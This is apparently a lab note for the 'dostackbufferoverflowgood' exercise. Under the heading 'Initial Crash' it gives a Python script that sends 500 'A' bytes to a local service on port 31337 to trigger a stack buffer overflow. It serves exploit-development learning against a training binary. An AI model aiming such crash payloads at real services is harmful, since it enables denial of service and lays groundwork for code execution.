# dostackbufferoverflowgood

## Initial Crash

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 31337
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 500  # change me

payload = b"A" * CRASH_LEN
payload += b"\n"

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    print(f"sent {sent} bytes")
```

